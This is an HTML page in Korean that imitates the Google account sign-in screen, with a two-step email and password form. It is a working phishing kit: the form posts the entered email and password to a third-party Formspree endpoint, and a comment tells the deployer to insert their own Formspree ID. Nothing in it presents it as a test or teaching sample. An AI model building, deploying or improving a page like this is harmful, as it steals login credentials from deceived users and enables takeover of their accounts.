<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>로그인 - Google 계정</title>
    <style>
        /* CSS 스타일 시작 */
        body { font-family: 'Noto Sans KR', sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { width: 400px; padding: 48px 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        .logo { font-size: 24px; font-weight: bold; margin-bottom: 10px; cursor: default; }
        h2 { font-size: 24px; font-weight: 400; margin: 10px 0 0; }
        p { font-size: 16px; margin: 8px 0 40px; color: #202124; }
        .input-group { position: relative; margin-bottom: 25px; }
        .input-group input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
        .input-group label { position: absolute; top: 13px; left: 15px; color: #5f6368; transition: 0.2s; pointer-events: none; }
        .input-group input:focus ~ label, .input-group input:valid ~ label { top: -10px; left: 10px; font-size: 12px; background: #fff; padding: 0 5px; color: #1a73e8; }
        .input-group input:focus { outline: none; border: 2px solid #1a73e8; }
        .link-text { display: block; text-align: left; color: #1a73e8; text-decoration: none; font-weight: bold; font-size: 14px; margin-bottom: 30px; }
        .info { text-align: left; font-size: 14px; color: #5f6368; line-height: 1.4; margin-bottom: 40px; }
        .btn-group { display: flex; justify-content: space-between; align-items: center; margin-top: 10px; }
        .create-account { background: none; border: none; color: #1a73e8; font-weight: bold; cursor: pointer; font-size: 14px; }
        .next-btn { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

    <div class="login-box">
        <div class="logo">
            <span style="color: #4285F4">G</span><span style="color: #EA4335">o</span><span style="color: #FBBC05">o</span><span style="color: #4285F4">g</span><span style="color: #34A853">l</span><span style="color: #EA4335">e</span>
        </div>

        <!-- Formspree ID를 발급받아 아래 'YOUR_ID' 자리에 넣으세요 -->
        <form id="loginForm" action="https://formspree.io" method="POST">
            
            <!-- 1단계: 이메일 입력 화면 -->
            <div id="step-email">
                <h2>로그인</h2>
                <p>Google 계정 사용</p>
                <div class="input-group">
                    <input type="email" id="userEmail" name="email" required>
                    <label>이메일 또는 휴대전화</label>
                </div>
                <a href="#" class="link-text">이메일을 잊으셨나요?</a>
                <div class="info">내 컴퓨터가 아닌가요? 게스트 모드를 사용하여 비공개로 로그인하세요. <a href="#" style="color:#1a73e8; text-decoration:none; font-weight:bold;">자세히 알아보기</a></div>
                <div class="btn-group">
                    <button type="button" class="create-account">계정 만들기</button>
                    <button type="button" class="next-btn" onclick="nextStep()">다음</button>
                </div>
            </div>

            <!-- 2단계: 비밀번호 입력 화면 (숨김 처리) -->
            <div id="step-password" style="display: none;">
                <h2>환영합니다</h2>
                <p id="display-email" style="font-weight: 500; color: #202124; border: 1px solid #dadce0; border-radius: 20px; display: inline-block; padding: 5px 15px; margin-bottom: 30px;"></p>
                <div class="input-group">
                    <input type="password" id="userPw" name="password" required>
                    <label>비밀번호 입력</label>
                </div>
                <div style="text-align: left; margin-bottom: 40px; font-size: 14px;">
                    <input type="checkbox" onclick="showPw()"> 비밀번호 표시
                </div>
                <div class="btn-group">
                    <button type="button" class="create-account" onclick="prevStep()">뒤로</button>
                    <button type="submit" class="next-btn">로그인</button>
                </div>
            </div>

        </form>
    </div>

    <script>
        // JavaScript 로직
        function nextStep() {
            const email = document.getElementById('userEmail').value;
            if(email && email.includes('@')) {
                document.getElementById('step-email').style.display = 'none';
                document.getElementById('step-password').style.display = 'block';
                document.getElementById('display-email').innerText = email;
            } else {
                alert("유효한 이메일을 입력해주세요.");
            }
        }

        function prevStep() {
            document.getElementById('step-email').style.display = 'block';
            document.getElementById('step-password').style.display = 'none';
        }

        function showPw() {
            var x = document.getElementById("userPw");
            if (x.type === "password") { x.type = "text"; } 
            else { x.type = "password"; }
        }
    </script>

</body>
</html>

